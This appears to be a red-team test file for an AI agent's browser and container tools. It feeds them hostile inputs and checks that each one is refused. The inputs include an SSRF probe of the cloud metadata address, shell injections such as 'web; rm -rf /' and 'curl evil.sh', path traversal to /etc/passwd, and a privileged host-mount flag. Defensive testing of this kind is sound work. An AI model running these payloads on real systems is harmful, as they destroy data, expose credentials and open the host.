// v0.42.0 RED TEAM PASS (war-room Play 4) — try to break the two new tools
// before they ship: garbage args, path escapes, SSRF, shell injection,
// prototype pollution, hostile evals. Every attack must be REFUSED HONESTLY
// (string starting with ERROR / refused / blocked) and must NEVER throw.
// A crash or a fake success = ship blocked.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { runBrowserCall } from '../src/tools/browser.js';
import { runContainers } from '../src/tools/containers.js';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'v42-redteam-'));
fs.mkdirSync(path.join(root, 'k8s'));
fs.writeFileSync(path.join(root, 'k8s/app.yaml'), 'apiVersion: v1');

const probes = {
  browser: () => 'playwright',   // pretend the driver exists — refusals must fire BEFORE any child runs
  containers: () => ({ docker: 'Docker version 27.3.1', compose: 'Docker Compose version 2.29.7', kubectl: 'kubectl', kind: null, minikube: null }),
};

const attacks = [
  // ── browser ──────────────────────────────────────────────────────────────
  ['browser SSRF metadata', () => runBrowserCall({ action: 'open', url: 'http://169.254.169.254/latest/meta-data/' }, { root, probe: probes.browser })],
  ['browser SSRF loopback', () => runBrowserCall({ action: 'open', url: 'http://127.0.0.1:14321/' }, { root, probe: probes.browser })],
  ['browser SSRF private v6', () => runBrowserCall({ action: 'open', url: 'http://[fd00::1]/' }, { root, probe: probes.browser })],
  ['browser scheme smuggling', () => runBrowserCall({ action: 'open', url: 'javascript:fetch("/admin")' }, { root, probe: probes.browser })],
  ['browser shot escape', () => runBrowserCall({ action: 'screenshot', url: 'https://x.com', path: '/etc/cron.d/evil.png' }, { root, probe: probes.browser })],
  ['browser shot traversal', () => runBrowserCall({ action: 'screenshot', path: '../../../../etc/passwd.png' }, { root, probe: probes.browser })],
  ['browser proto pollution', () => runBrowserCall({ action: '__proto__', url: 'https://x.com' }, { root, probe: probes.browser })],
  ['browser steps not array', () => runBrowserCall({ steps: 'open everything' }, { root, probe: probes.browser })],
  ['browser hostile eval bomb', () => runBrowserCall({ action: 'eval', js: 'while(true){}'.repeat(600) }, { root, probe: probes.browser })],
  ['browser steps flood', () => runBrowserCall({ steps: Array.from({ length: 500 }, () => ({ action: 'wait', ms: 1 })) }, { root, probe: probes.browser })],
  // ── containers ───────────────────────────────────────────────────────────
  ['containers service injection', () => runContainers({ action: 'up', services: ['web; rm -rf /'] }, { root, probe: probes.containers })],
  ['containers service $() inject', () => runContainers({ action: 'logs', services: ['$(whoami)'] }, { root, probe: probes.containers })],
  ['containers compose escape', () => runContainers({ action: 'up', file: '/etc/docker/daemon.json' }, { root, probe: probes.containers })],
  ['containers compose traversal', () => runContainers({ action: 'down', file: '../../../etc/hosts' }, { root, probe: probes.containers })],
  ['containers deploy /etc/passwd', () => runContainers({ action: 'deploy', file: '/etc/passwd' }, { root, probe: probes.containers })],
  ['containers ns injection', () => runContainers({ action: 'deploy', file: 'k8s/app.yaml', namespace: 'default; curl evil.sh' }, { root, probe: probes.containers })],
  ['containers tail injection', () => runContainers({ action: 'logs', services: ['web'], tail: '80; shutdown now' }, { root, probe: probes.containers })],
  ['containers flag smuggling', () => runContainers({ action: 'up --privileged -v /:/host' }, { root, probe: probes.containers })],
  ['containers proto pollution', () => runContainers({ action: 'constructor' }, { root, probe: probes.containers })],
  ['containers garbage action', () => runContainers({ action: {} }, { root, probe: probes.containers })],
];

let pass = 0, fail = 0;
for (const [name, fn] of attacks) {
  try {
    const out = String(await fn());
    const refused = /^(ERROR:|.*refused|.*blocked|.*escapes|.*not found|.*bad |.*unknown |.*too many|.*too long)/.test(out);
    if (refused) { pass++; console.log(`  ✔ ${name} → ${out.split('\n')[0].slice(0, 88)}`); }
    else { fail++; console.log(`  ✖ ${name} → NOT REFUSED: ${out.slice(0, 120)}`); }
  } catch (e) {
    fail++; console.log(`  ✖ ${name} → THREW: ${String(e && e.message || e).slice(0, 120)}`);
  }
}
console.log(`\nRED TEAM: ${pass}/${attacks.length} attacks refused honestly, ${fail} failures`);
process.exit(fail ? 1 : 0);
